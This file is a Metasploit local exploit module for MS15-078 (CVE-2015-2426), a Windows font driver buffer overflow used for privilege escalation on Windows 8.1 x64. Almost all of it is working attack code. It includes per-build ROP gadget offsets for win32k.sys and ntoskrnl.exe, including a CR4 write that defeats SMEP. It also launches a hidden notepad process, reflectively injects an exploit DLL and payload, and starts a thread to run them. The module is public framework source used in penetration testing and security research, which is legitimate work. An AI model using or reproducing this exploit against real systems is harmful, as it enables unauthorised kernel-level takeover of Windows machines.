##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = ManualRanking

  WIN32K_VERSIONS = [
    '6.3.9600.17393',
    '6.3.9600.17630',
    '6.3.9600.17694',
    '6.3.9600.17796',
    '6.3.9600.17837',
    '6.3.9600.17915'
  ]

  NT_VERSIONS = [
    '6.3.9600.17415',
    '6.3.9600.17630',
    '6.3.9600.17668',
    '6.3.9600.17936'
  ]

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'            => 'MS15-078 Microsoft Windows Font Driver Buffer Overflow',
      'Description'     => %q{
        This module exploits a pool based buffer overflow in the atmfd.dll driver when parsing
        a malformed font. The vulnerability was exploited by the hacking team and disclosed on
        the july data leak. This module has been tested successfully on vulnerable builds of
        Windows 8.1 x64.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [
          'Eugene Ching',    # vulnerability discovery and exploit
          'Mateusz Jurczyk', # vulnerability discovery
          'Cedric Halbronn', # vulnerability and exploit analysis
          'juan vazquez'     # msf module
        ],
      'Arch'            => ARCH_X86_64,
      'Platform'        => 'win',
      'SessionTypes'    => [ 'meterpreter' ],
      'DefaultOptions'  => {
          'EXITFUNC'    => 'thread',
        },
      'Targets'         => [
          [ 'Windows 8.1 x64',  { } ]
        ],
      'Payload'         => {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'      => [
          ['CVE', '2015-2426'],
          ['CVE', '2015-2433'],
          ['MSB', 'MS15-078'],
          ['MSB', 'MS15-080'],
          ['URL', 'https://github.com/vlad902/hacking-team-windows-kernel-lpe'],
          ['URL', 'https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/september/exploiting-cve-2015-2426-and-how-i-ported-it-to-a-recent-windows-8.1-64-bit/'],
          ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=369'],
          ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=480']
        ],
      'DisclosureDate'  => 'Jul 11 2015',
      'DefaultTarget'   => 0
    }))
  end

  def patch_win32k_offsets(dll)
    @win32k_offsets.each do |k, v|
      case k
      when 'info_leak'
        dll.gsub!([0xdeedbeefdeedbe00].pack('Q<'), [v].pack('Q<'))
      when 'pop_rax_ret'
        dll.gsub!([0xdeedbeefdeedbe01].pack('Q<'), [v].pack('Q<'))
      when 'xchg_rax_rsp'
        dll.gsub!([0xdeedbeefdeedbe02].pack('Q<'), [v].pack('Q<'))
      when 'allocate_pool'
        dll.gsub!([0xdeedbeefdeedbe03].pack('Q<'), [v].pack('Q<'))
      when 'pop_rcx_ret'
        dll.gsub!([0xdeedbeefdeedbe04].pack('Q<'), [v].pack('Q<'))
      when 'deref_rax_into_rcx'
        dll.gsub!([0xdeedbeefdeedbe05].pack('Q<'), [v].pack('Q<'))
      when 'mov_rax_into_rcx'
        dll.gsub!([0xdeedbeefdeedbe06].pack('Q<'), [v].pack('Q<'))
      when 'pop_rbx_ret'
        dll.gsub!([0xdeedbeefdeedbe07].pack('Q<'), [v].pack('Q<'))
      when 'ret'
        dll.gsub!([0xdeedbeefdeedbe08].pack('Q<'), [v].pack('Q<'))
      when 'mov_rax_r11_ret'
        dll.gsub!([0xdeedbeefdeedbe09].pack('Q<'), [v].pack('Q<'))
      when 'add_rax_rcx_ret'
        dll.gsub!([0xdeedbeefdeedbe0a].pack('Q<'), [v].pack('Q<'))
      when 'pop_rsp_ret'
        dll.gsub!([0xdeedbeefdeedbe0b].pack('Q<'), [v].pack('Q<'))
      when 'xchg_rax_rsp_adjust'
        dll.gsub!([0xdeedbeefdeedbe0c].pack('Q<'), [v].pack('Q<'))
      when 'chwnd_delete'
        dll.gsub!([0xdeedbeefdeedbe0d].pack('Q<'), [v].pack('Q<'))
      end
    end
  end

  def set_win32k_offsets
    @win32k_offsets ||= Proc.new do |version|
      case version
      when '6.3.9600.17393'
        {
          'info_leak'           => 0x3cf00,
          'pop_rax_ret'         => 0x19fab,  # pop rax # ret # 58 C3
          'xchg_rax_rsp'        => 0x6121,   # xchg eax, esp # ret # 94 C3
          'allocate_pool'       => 0x352220, # import entry nt!ExAllocatePoolWithTag
          'pop_rcx_ret'         => 0x98156,  # pop rcx # ret # 59 C3
          'deref_rax_into_rcx'  => 0xc432f,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          'mov_rax_into_rcx'    => 0xc4332,  # mov [rcx], rax # ret # 48 89 01 C3
          'pop_rbx_ret'         => 0x14db,   # pop rbx # ret # 5B C3
          'ret'                 => 0x6e314,  # ret C3
          'mov_rax_r11_ret'     => 0x7018e,  # mov rax, r11 # ret # 49 8B C3 C3
          'add_rax_rcx_ret'     => 0xee38f,  # add rax, rcx # ret # 48 03 C1 C3
          'pop_rsp_ret'         => 0xbc8f,   # pop rsp # ret # 5c c3
          'xchg_rax_rsp_adjust' => 0x189a3a, # xchg esp, eax # sbb al, 0 # mov eax, ebx # add rsp, 20h # pop rbx # ret # 94 1C 00 8B C3 48 83 c4 20 5b c3
          'chwnd_delete'        => 0x165010  # CHwndTargetProp::Delete
        }
      when '6.3.9600.17630'
        {
          'info_leak'           => 0x3d200,
          'pop_rax_ret'         => 0x19e9b,  # pop rax # ret # 58 C3
          'xchg_rax_rsp'        => 0x6024,   # xchg eax, esp # ret # 94 C3
          'allocate_pool'       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          'pop_rcx_ret'         => 0x84f4f,  # pop rcx # ret # 59 C3
          'deref_rax_into_rcx'  => 0xc3f7f,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          'mov_rax_into_rcx'    => 0xc3f82,  # mov [rcx], rax # ret # 48 89 01 C3
          'pop_rbx_ret'         => 0x14db,   # pop rbx # ret # 5B C3
          'ret'                 => 0x14dc,   # ret C3
          'mov_rax_r11_ret'     => 0x7034e,  # mov rax, r11 # ret # 49 8B C3 C3
          'add_rax_rcx_ret'     => 0xed33b,  # add rax, rcx # ret # 48 03 C1 C3
          'pop_rsp_ret'         => 0xbb93,   # pop rsp # ret # 5c c3
          'xchg_rax_rsp_adjust' => 0x17c78c, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          'chwnd_delete'        => 0x146EE0  # CHwndTargetProp::Delete
        }
      when '6.3.9600.17694'
        {
          'info_leak'           => 0x3d300,
          'pop_rax_ret'         => 0x151f4,  # pop rax # ret # 58 C3
          'xchg_rax_rsp'        => 0x600c,   # xchg eax, esp # ret # 94 C3
          'allocate_pool'       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          'pop_rcx_ret'         => 0x2cf10,  # pop rcx # ret # 59 C3
          'deref_rax_into_rcx'  => 0xc3757,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          'mov_rax_into_rcx'    => 0xc375a,  # mov [rcx], rax # ret # 48 89 01 C3
          'pop_rbx_ret'         => 0x6682,   # pop rbx # ret # 5B C3
          'ret'                 => 0x6683,   # ret C3
          'mov_rax_r11_ret'     => 0x7010e,  # mov rax, r11 # ret # 49 8B C3 C3
          'add_rax_rcx_ret'     => 0xecd7b,  # add rax, rcx # ret # 48 03 C1 C3
          'pop_rsp_ret'         => 0x71380,  # pop rsp # ret # 5c c3
          'xchg_rax_rsp_adjust' => 0x178c84, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          'chwnd_delete'        => 0x1513D8  # CHwndTargetProp::Delete
        }
      when '6.3.9600.17796'
        {
          'info_leak'           => 0x3d000,
          'pop_rax_ret'         => 0x19e4f,  # pop rax # ret # 58 C3
          'xchg_rax_rsp'        => 0x5f64,   # xchg eax, esp # ret # 94 C3
          'allocate_pool'       => 0x352220, # import entry nt!ExAllocatePoolWithTag
          'pop_rcx_ret'         => 0x97a5e,  # pop rcx # ret # 59 C3
          'deref_rax_into_rcx'  => 0xc3aa7,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          'mov_rax_into_rcx'    => 0xc3aaa,  # mov [rcx], rax # ret # 48 89 01 C3
          'pop_rbx_ret'         => 0x1B20,   # pop rbx # ret # 5B C3
          'ret'                 => 0x1B21,   # ret C3
          'mov_rax_r11_ret'     => 0x7010e,  # mov rax, r11 # ret # 49 8B C3 C3
          'add_rax_rcx_ret'     => 0xecf8b,  # add rax, rcx # ret # 48 03 C1 C3
          'pop_rsp_ret'         => 0x29fd3,  # pop rsp # ret # 5c c3
          'xchg_rax_rsp_adjust' => 0x1789e4, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          'chwnd_delete'        => 0x150F58  # CHwndTargetProp::Delete

        }
      when '6.3.9600.17837'
        {
          'info_leak'           => 0x3d800,
          'pop_rax_ret'         => 0x1a51f,  # pop rax # ret # 58 C3
          'xchg_rax_rsp'        => 0x62b4,   # xchg eax, esp # ret # 94 C3
          'allocate_pool'       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          'pop_rcx_ret'         => 0x97a4a,  # pop rcx # ret # 59 C3
          'deref_rax_into_rcx'  => 0xc3687,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          'mov_rax_into_rcx'    => 0xc368a,  # mov [rcx], rax # ret # 48 89 01 C3
          'pop_rbx_ret'         => 0x14db,   # pop rbx # ret # 5B C3
          'ret'                 => 0x14dc,   # ret C3
          'mov_rax_r11_ret'     => 0x94871,  # mov rax, r11 # ret # 49 8B C3 C3
          'add_rax_rcx_ret'     => 0xecbdb,  # add rax, rcx # ret # 48 03 C1 C3
          'pop_rsp_ret'         => 0xbd2c,   # pop rsp # ret # 5c c3
          'xchg_rax_rsp_adjust' => 0x15e84c, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          'chwnd_delete'        => 0x15A470  # CHwndTargetProp::Delete
        }
      when '6.3.9600.17915'
        {
          'info_leak'           => 0x3d800,
          'pop_rax_ret'         => 0x1A4EF,  # pop rax # ret # 58 C3
          'xchg_rax_rsp'        => 0x62CC,   # xchg eax, esp # ret # 94 C3
          'allocate_pool'       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          'pop_rcx_ret'         => 0x9765A,  # pop rcx # ret # 59 C3
          'deref_rax_into_rcx'  => 0xC364F,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          'mov_rax_into_rcx'    => 0xC3652,  # mov [rcx], rax # ret # 48 89 01 C3
          'pop_rbx_ret'         => 0x14DB,   # pop rbx # ret # 5B C3
          'ret'                 => 0x14DC,   # ret # C3
          'mov_rax_r11_ret'     => 0x7060e,  # mov rax, r11 # ret # 49 8B C3 C3
          'add_rax_rcx_ret'     => 0xECDCB,  # add rax, rcx # 48 03 C1 C3
          'pop_rsp_ret'         => 0xbe33,   # pop rsp # ret # 5c c3
          'xchg_rax_rsp_adjust' => 0x15e5fc, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          'chwnd_delete'        => 0x15A220  # CHwndTargetProp::Delete
        }
      else
        nil
      end
    end.call(@win32k)
  end

  def patch_nt_offsets(dll)
    @nt_offsets.each do |k, v|
      case k
      when 'set_cr4'
        dll.gsub!([0xdeedbeefdeedbe0e].pack('Q<'), [v].pack('Q<'))
      when 'allocate_pool_with_tag'
        dll.gsub!([0xdeedbeefdeedbe0f].pack('Q<'), [v].pack('Q<'))
      end
    end
  end

  def set_nt_offsets
    @nt_offsets ||= Proc.new do |version|
      case version
      when '6.3.9600.17415'
        {
          'set_cr4'                => 0x38a3cc, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          'allocate_pool_with_tag' => 0x2a3a50  # ExAllocatePoolWithTag
        }
      when '6.3.9600.17630'
        {
          'set_cr4'                => 0x38A3BC, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          'allocate_pool_with_tag' => 0x2A3A50  # ExAllocatePoolWithTag
        }
      when '6.3.9600.17668'
        {
          'set_cr4'                => 0x38A3BC, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          'allocate_pool_with_tag' => 0x2A3A50  # ExAllocatePoolWithTag
        }
      when '6.3.9600.17936'
        {
          'set_cr4'                => 0x3863bc, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          'allocate_pool_with_tag' => 0x29FA50  # ExAllocatePoolWithTag
        }
      else
        nil
      end
    end.call(@ntoskrnl)
  end

  def atmfd_version
    file_path = expand_path('%windir%') << '\\system32\\atmfd.dll'
    major, minor, build, revision, branch = file_version(file_path)
    return nil if major.nil?
    ver = "#{major}.#{minor}.#{build}.#{revision}"
    vprint_status("atmfd.dll file version: #{ver} branch: #{branch}")

    ver
  end

  def win32k_version
    file_path = expand_path('%windir%') << '\\system32\\win32k.sys'
    major, minor, build, revision, branch = file_version(file_path)
    return nil if major.nil?
    ver = "#{major}.#{minor}.#{build}.#{revision}"
    vprint_status("win32k.sys file version: #{ver} branch: #{branch}")

    ver
  end

  def ntoskrnl_version
    file_path = expand_path('%windir%') << '\\system32\\ntoskrnl.exe'
    major, minor, build, revision, branch = file_version(file_path)
    return nil if major.nil?
    ver = "#{major}.#{minor}.#{build}.#{revision}"
    vprint_status("ntoskrnl.exe file version: #{ver} branch: #{branch}")

    ver
  end

  def check
    # We have tested only windows 8.1
    if sysinfo['OS'] !~ /Windows 8/i
      return Exploit::CheckCode::Unknown
    end

    # We have tested only 64 bits
    if sysinfo['Architecture'] !~ /(wow|x)64/i
      return Exploit::CheckCode::Unknown
    end

    atmfd = atmfd_version
    # atmfd 5.1.2.238 => Works
    unless atmfd && Gem::Version.new(atmfd) <= Gem::Version.new('5.1.2.243')
      return Exploit::CheckCode::Safe
    end

    # win32k.sys 6.3.9600.17393 => Works
    @win32k = win32k_version

    unless @win32k && WIN32K_VERSIONS.include?(@win32k)
      return Exploit::CheckCode::Detected
    end

    # ntoskrnl.exe 6.3.9600.17415 => Works
    @ntoskrnl = ntoskrnl_version

    unless @ntoskrnl && NT_VERSIONS.include?(@ntoskrnl)
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Appears
  end

  def exploit
    print_status('Checking target...')
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    check_result = check
    if check_result == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, 'Target not vulnerable')
    end

    if check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
    end

    if check_result == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, 'ROP chain not available for the target nt/win32k')
    end

    unless get_target_arch == ARCH_X86_64
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    end

    print_status("Exploiting with win32k #{@win32k} and nt #{@ntoskrnl}...")

    set_win32k_offsets
    fail_with(Failure::NoTarget, 'win32k.sys offsets not available') if @win32k_offsets.nil?

    set_nt_offsets
    fail_with(Failure::NoTarget, 'ntoskrnl.exe offsets not available') if @nt_offsets.nil?

    begin
      print_status('Launching notepad to host the exploit...')
      notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-2426', 'reflective_dll.x64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    dll = ''
    ::File.open(library_path, 'rb') { |f| dll = f.read }

    patch_win32k_offsets(dll)
    patch_nt_offsets(dll)

    exploit_mem, offset = inject_dll_data_into_process(process, dll)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

end